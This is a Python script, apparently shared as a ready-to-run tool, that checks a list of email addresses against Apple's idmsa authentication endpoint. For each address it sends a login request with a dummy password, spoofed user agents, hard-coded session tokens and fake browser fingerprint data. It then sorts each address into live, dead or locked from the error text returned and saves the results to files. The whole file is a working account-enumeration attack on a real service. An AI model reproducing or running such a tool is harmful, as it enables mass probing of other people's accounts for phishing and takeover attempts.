# Author : DSWEB19778
# Version : 3.0
# Title : Apple ID checker
# Date : 2021
# Donate : https://paypal.me/wecandoittogheter
# Thanks to : God First & me
# Note : This Just an update for old script this will make it stable and faster
# Make sure to update keys every week

from inc.rest import *
from inc.config import *


clear(system_eck())  # Clean Command
print(logo("DSWEB19778", time.asctime(), "3.0",
      "APPLE-API", "https://paypal.me/wecandoittogheter"))


def apple_api(email):  # Apple API

    url = "https://idmsac.apple.com/authenticate"  # URL

    # Open new Session For unlimited Check --- SOON

    Env = "PROD"
    accNameLocked = "false"
    appIdKey = "c991a1687d72e54d35d951a58cf7aa33fe722353b48f89d27c1ea2ffa08a4b80"
    browser = ["chrome", "firefox"]
    randbrowser = h.choice(browser)

    clientInfo = {
        "U": fakeagent(randbrowser),
        "L": "fr-FR",
        "Z": "GMT+01:00",
        "V": "1.1",
        "F": "Fta44j1e3NlY5BSo9z4ofjb75PaK4Vpjt.gEngMQEjZrVgszl998tp7ppfAaZ6m1CdC5MQjGejuTDRNziCvTDfWoefTPF90OkxjPm8LKfAaZ4pAJZ7OQuyPBB2SCXw2SCVL6yXyjaY1WMsiZRPrwVL6tqAhbrmQkLRUs_43wuZPup_nH2t05oaYAhrcpMxE6DBUr5xj6KkuKKjC74.gsTrhO3f9p_nH1wzQk1hCUMnGWqbPaRgwe98vDdYejftckuyPBDjaY2ftckkCoq1HACVdYFeI1bgJ6LLtQkmbFVDJhCult2uXjodUW2Reif6KPBSpHrk.Nk4JkJlo9Y_3Drf6ZE_JzH_yJhp0iKMKXJ2237lY5BSmxGY5BOgkLT0XxU..BWP"
    }

    fdcBrowserData = {
        "U": fakeagent(randbrowser),
        "L": "fr-FR",
        "Z": "GMT+01:00",
        "V": "1.1",
        "F": "Fta44j1e3NlY5BSo9z4ofjb75PaK4Vpjt.gEngMQEjZrVgszl998tp7ppfAaZ6m1CdC5MQjGejuTDRNziCvTDfWoefTPF90OkxjPm8LKfAaZ4pAJZ7OQuyPBB2SCXw2SCVL6yXyjaY1WMsiZRPrwVL6tqAhbrmQkLRUs_43wuZPup_nH2t05oaYAhrcpMxE6DBUr5xj6KkuKKjC74.gsTrhO3f9p_nH1wzQk1hCUMnGWqbPaRgwe98vDdYejftckuyPBDjaY2ftckkCoq1HACVdYFeI1bgJ0VMAT5Ju30m_djLE7UJKy_Aw7Q_KpNufGYiOKw.5B0KB4BS1ctG2hult2tKEodU_ASFQ_KpN_.kl1BNlY6RjJNlY5QB4bVNjMk.BsA"
    }

    openiForgotInNewWindow = "false"
    referer = "https://idmsa.apple.com/login.html?appIdKey=f63dc42a63424f0876a5d56bcc1f3e8952e0b9c3ecef205d4f46bd99dc33c615"
    requestUri = "/authenticate"
    scnt = "AAAAKjRDQTcwQkEwNjg0REY5OThGRkY3MkU0MEUzNkFBRjExfDcAAAF4wknZkwVm0OXggrltcwhO1Ajzop9Kx3YaUCtLvznwS13dWO9M8Jcf+wTWJf0ACC+VmOLD9QUZAP1ukEvh+oVmcMMU/wvsC1VL2irgXNy5ZlbVASlq"
    headers = {
        'Cookie': 'JSESSIONID=9525DE46BAD634E945F96BD384F20C48; dslang=US-EN',
        'User-Agent': fakeagent(randbrowser),
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    datap = {
        "Env": Env,
        "accNameLocked": accNameLocked,
        "accountPassword": "0000",
        "appIdKey": appIdKey,
        "appleId": email,
        "clientInfo": clientInfo,
        "fdcBrowserData": fdcBrowserData,
        "language": "EN-EN",
        "openiForgotInNewWindow": "false",
        "referer": "https://idmsa.apple.com/login.html?appIdKey=c991a1687d72e54d35d951a58cf7aa33fe722353b48f89d27c1ea2ffa08a4b80",
        "requestUri": "/login.html",
        "scnt": "AAAAKjRDQTcwQkEwNjg0REY5OThGRkY3MkU0MEUzNkFBRjExfDgAAAF4wkpAOiQ/PJ4MKRc9MmL2krsJrhQeCHP8c+OmyKNryZZ1CPyj/TuwTaAjFxAACC+btzqvTdO40Ez54iRv+pjTdVPoteqFO4kHLBq918bHrxrrRNB8"
    }

    ses = req.session()  # Start Session
    post = ses.post(url, data=datap, headers=headers).content.decode("utf-8")
    dead = "Your account information was entered incorrectly."
    live = "Access denied. Your account does not have permission to access this application."
    limited = "This Apple ID has been locked for security reasons. Visit iForgot to reset your account"
    if dead in post:
        fsadead = open(deadm, mod_save)
        fsadead.write("\n"+email)
        print(red+"    Dead : "+str(email)+" - "+str(time.ctime()))
        ses.cookies.clear()

    elif live in post:
        fsavalid = open(livem, mod_save)
        fsavalid.write("\n"+email)
        print(green+"    Live : "+str(email)+" - "+str(time.ctime()))
        ses.cookies.clear()

    elif limited in post:
        fsalimit = open(limitm, mod_save)
        fsalimit.write("\n"+email)
        print(yellow+"    Locked : "+str(email)+" - "+str(time.ctime()))
        ses.cookies.clear()

    else:
        print(yell+"    --- Server Problem Exit...")
        ses.cookies.clear()
        exit()


if __name__ == "__main__":

    try:

        ask = input(genta+"    File #> ")
        mod = "r+"
        op = open(ask, mod).readlines()
        listo = len(op)
        print("    Rzlt Folder Checking...")
        flr = rzlt_folder()
        if flr == True:
            print("    - Already Exist.")
        else:
            print("    - Creating Folder. Done")
        print("    List: "+red+str(listo)+"\n")

        for fr in op:

            x = fr.rstrip("\n")
            apple_api(x)

    except IOError as err:
        print("    ERROR -> "+str(err))
        exit()
    except EOFError as err:
        print("    ERROR -> "+str(err))
        exit()
    except IndexError as err:
        print("    ERROR -> "+str(err))
        exit()
    except KeyError as err:
        print("    ERROR -> "+str(err))
        exit()
    except KeyboardInterrupt as err:
        print("    [KILLED] By user")
        exit()
